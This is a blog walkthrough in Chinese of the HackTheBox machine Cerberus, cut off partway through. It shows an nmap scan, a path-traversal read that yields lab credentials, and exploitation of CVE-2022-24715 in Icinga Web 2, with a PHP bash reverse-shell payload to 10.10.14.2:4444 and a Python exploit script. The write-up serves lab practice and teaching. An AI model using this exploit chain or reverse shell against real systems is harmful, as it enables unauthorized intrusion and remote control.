---
title: Cerberus - HackTheBox
url: https://darkwing.moe/2023/03/22/Cerberus-HackTheBox/
source: 喵喵喵喵
date: 2023-03-23
fetch_date: 2025-10-04T10:19:55.923512
---

# Cerberus - HackTheBox

[![](/img/avatar.jpg)](/)

##### 暗羽

Discord@darkwing\_nya

* [主页](/)
* [Archives](/archives)
* [Tags](/tags)
* [Categories](/categories)
* [Github](https://github.com/zjicmDarkWing)
* [Twitter](https://twitter.com/darkwing_nya)
* [Buy me a coffee](https://www.buymeacoffee.com/darkwing_nya)
* [About](https://darkwing.moe/2015/01/01/about/)

Cerberus - HackTheBox

# Cerberus - HackTheBox

##### 2023-03-22

#### TOC

1. [1. 基本信息](#基本信息)
2. [2. 端口扫描](#端口扫描)
   1. [2.1. 8080](#8080)
3. [3. icingaweb2](#icingaweb2)
   1. [3.1. LFI](#LFI)
   2. [3.2. web](#web)
   3. [3.3. CVE-2022-24715](#CVE-2022-24715)
   4. [3.4. exp.py](#exp-py)
4. [4. 容器](#容器)
   1. [4.1. 容器提权](#容器提权)
   2. [4.2. 信息](#信息)
5. [5. user flag](#user-flag)
6. [6. 提权信息](#提权信息)
   1. [6.1. CVE-2022-47966](#CVE-2022-47966)
   2. [6.2. proxy](#proxy)
7. [7. exploit & root flag](#exploit-amp-root-flag)
   1. [7.1. root flag](#root-flag)
   2. [7.2. hashdump](#hashdump)
8. [8. 参考资料](#参考资料)

# Cerberus - HackTheBox

2023-03-22

# 基本信息

* <https://app.hackthebox.com/machines/534>
* 10.10.11.205

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032201.jpg)

# 端口扫描

就一个8080:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 ``` | ``` $ nmap -sC -sV -Pn 10.10.11.205 Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-22 09:49 CST Nmap scan report for 10.10.11.205 Host is up (0.091s latency). Not shown: 999 filtered tcp ports (no-response) PORT     STATE SERVICE VERSION 8080/tcp open  http    Apache httpd 2.4.52 ((Ubuntu)) |_http-open-proxy: Proxy might be redirecting requests |_http-server-header: Apache/2.4.52 (Ubuntu) |_http-title: Did not follow redirect to http://icinga.cerberus.local:8080/icingaweb2  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 63.52 seconds ``` |

## 8080

需要加hosts,icingaweb2：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` 10.10.11.205  icinga.cerberus.local ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032202.jpg)

# icingaweb2

可以搜到相关漏洞：

* Path Traversal Vulnerabilities in Icinga Web | Sonar
  <https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/>

## LFI

首先是LFI读文件：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032203.jpg)

根据文档读一些配置文件，得到账号密码：

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` matthew IcingaWebPassword2023 ``` |

* Advanced Topics - Icinga Web
  <https://icinga.com/docs/icinga-web/latest/doc/20-Advanced-Topics/#advanced-topics-authentication-tips-manual-user-database-auth>

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032204.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032205.jpg)

## web

得到的账号密码可以登录web：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032206.jpg)

## CVE-2022-24715

然后就是登录后利用CVE-2022-24715，就是根据sonar博客里的步骤：

1. 创建一个ssh密钥对：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` ssh-keygen -t rsa -m PEM ``` |

2. 在 icingaweb 中创建一个新的 SSH 资源

   **配置 -> 资源 -> 创建新资源**

   |  |  |
   | --- | --- |
   | ``` 1 2 3 ``` | ``` Resource Name: ssh-user User: ssh-user Private Key: <Your generated Key> ``` |
3. 创建一个新资源执行php代码

   |  |  |
   | --- | --- |
   | ``` 1 2 3 ``` | ``` Resource Name: SHELL User: ../../../../../dev/shm/run.php Private Key: file:///etc/icingaweb2/ssh/ssh-user%00 <?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'"); ``` |
4. 转到**Configuration -> Application**并更改 Module Path 以包含 /dev/

   |  |  |
   | --- | --- |
   | ``` 1 ``` | ``` WHATEVER:/dev/ ``` |
5. 转到**Configuration -> Modules**并启用**shm**， 触发执行得到shell

Discord里也给出了一个自动化脚本:

|  |  |
| --- | --- |
| ``` 1 ``` | ``` python3 icingaweb2.py -i 10.10.14.2 -p 4444 ``` |

得到的是容器的www-data:

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032207.jpg)

## exp.py

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 ``` | ``` import requests import bs4 import argparse import random import string  def get_csrf(resp):     soup = bs4.BeautifulSoup(resp.text, "lxml")     csrf_token = soup.find("input", {"id": "CSRFToken"})["value"]     return csrf_token   if __name__ == "__main__":     parser = argparse.ArgumentParser(description='lol')     parser.add_argument('-i', '--ip', help='nc listener ip', required=True)     parser.add_argument('-p', '--port', help='nc listener port', required=True)      args = parser.parse_args()      session = requests.session()      # LOGIN     URL = "http://icinga.cerberus.local:8080/icingaweb2/authentication/login"     resp = session.get(URL)     csrf_token = get_csrf(resp)     data = {"username":"matthew","password":"IcingaWebPassword2023","rememberme":"0","redirect":"","formUID":"form_login","CSRFToken":csrf_token,"btn_submit":"Login"}     resp = session.post(URL, data=data)      # CHANGE MODULE PATH     URL = "http://icinga.cerberus.local:8080/icingaweb2/config/general"     resp = session.get(URL)     csrf_token = get_csrf(resp)     data = {"global_show_stacktraces":"0","global_show_stacktraces":"1","global_show_application_state_messages":"0","global_show_application_state_messages":"1","global_module_path":"/dev/","global_config_resource":"icingaweb2","logging_log":"syslog","logging_level":"ERROR","logging_application":"icingaweb2","logging_facility":"user","themes_default":"Icinga","themes_disabled":"0","authentication_default_domain":"","formUID":"form_config_general","CSRFToken":csrf_token,"btn_submit":"Save Changes"}     resp = session.post(URL, data=data)      # ENABLE MODULE     URL = "http://icinga.cerberus.local:8080/icingaweb2/config/moduleenable"     resp = session.get(URL)     csrf_token = get_csrf(resp)     data = {"identifier":"shm","CSRFToken":csrf_token,"btn_submit":"btn_submit"}     resp = session.post(URL, data=data)      # UPLOAD SSH KEY     URL = "http://icinga.cerberus.local:8080/icingaweb2/config/createresource"     resp = session.get(URL)     csrf_token = get_csrf(resp)     data = {"type":"ssh","name":"test","user":"test","private_key":"-----BEGIN RSA PRIVATE KEY-----\r\n\ MIIG4gIBAAKCAYEAnwzoFa6BxCXcWsbMWc2G50BK29CEcnkxN3PkFZsQmZJNZexc\r\n\ 5+SlFBXMLcxAhlvOkrUyHg5Jc7pMiPL57TgbmQXxKWmz4/fk/eXaS3II1fxuWDmx\r\n\ X3bdBUfFbCWs+Hlk3fFJgO+CHiJuafNucKWSEIrJgYiOCWM3rWHc83pCf2MGkaki\r\n\ p1I5CTy5bIivpBQgdOhGBRRbw7J5CX0uBe6j/gTVMihnsuZAU11nkFrvaDYTLdCg\r\n\ ksn7Dov1mZRN8IELJCHyOQwJUSTaR8vlbkksGQWKL4HZiJ71zvqw3CJQIbMGfhAW\r\n\ mWB35Vg19aA1Q7PO1Dnzm8IOO3h51w6sdysBUFkvE3B/APED1ZjP7y717NBXGJI9\r\n\ ZbWPJW6hXbwx8++h12QfxFleXJltCWXbTc6vkrUoQ2Gqe0+G/2fBXLviLmGRNhOX\r\n\ Af9VWQJ9JmdU/epe6W7EujE4krfk7MwnNXLfJIB1y0BOqtd8mVAyGwOoCsvk/aJ+\r\n\ j1yQZBvN45M+W1RpAgMBAAECggGAIxtMdBK1gnfv7FqSmyTeSNd8XoonXgQprKmI\r\n\ OAum7ZrpOhziwe3KUUVhcN9zg6Sqk1/q7M7vABwoThdBus6Gau+wlFlIU4KxeSh9\r\n\ 12bXk/IY4iDz6ZQ5Q3Pc3Brx09Opw8KBXLQhJqkncXwBzdwCAmQ8B7s+TMyparwd\r\n\ 8uEy4d7YAZlRdJjVzZfpfs8p47/sjRmC8RaWDbtsc399w+HxsT1cWKqp/wdLPgtx\r\n\ M2AbFYfQEm4JL3VlVMfoYWqmjHZTB7+nHDFu2oY/0Jau+wgFUbxNVNGuBUz1xhkv\r\n\ 9dPItJuzn0IeHxdEmnMyA8MggFzM8kTql7Mbcwhm8NdXuasnADNvT8rYQnXkN3N+\r\n\ cgSNSX2EPFZlkiYNMnw01MSNmvndEBjkeB3UIGT4nA91FA21kUQtQXsczDvfITUw\r\n\ FZi6azdyRKyEpIQeFDdWVAO//IfCOrAMdT8A2ZZ0xBm2B6ipUG3OkV1OK9c+GhPB\r\n\ FcnXTIywMqcvYXPS3nd+ZfhPonKNAoHBAL56caVU0/2oQ30l9hjCM2EwZuUgt4G+\r\n\ QKwPtUhvqVipyDJ9othh5ouNylqzGm5togqVmRTZGiZkc9qFzGuPlYE2lXdYZ8vA\r\n\ bDk6aroDjkwhSzgIRRc9aqDyMgwf2kpNAjfb4Gj7K1W7HZesLZD03p6A5OXf3K8l\r\n\ BdLj9iQl5DbP3yucAqn7Kao3nwwcxbJGeXhPjV9QZb1SdfGGbnVwMyUe5BqCi3Dn\r\n\ qNQq7IZXm33EWRr8P51yAVsyjTOx47ANlQKBwQDVwurYfD7ethyI8HksCWIZWqEe\r\n\ SYcqWOZQtIBlmy9K9cgMlZUNLWrFm9Dj4AJBsZcR7X9mqHsRZTw6UZIqSXfGXhDq\r\n\ D02du2UzCFmdsBvn722sVJ19QOZcVVYtIEMpAV42IBqisdyk2htzMWaRsjQuaNuw\r\n\ bbVenCOnH...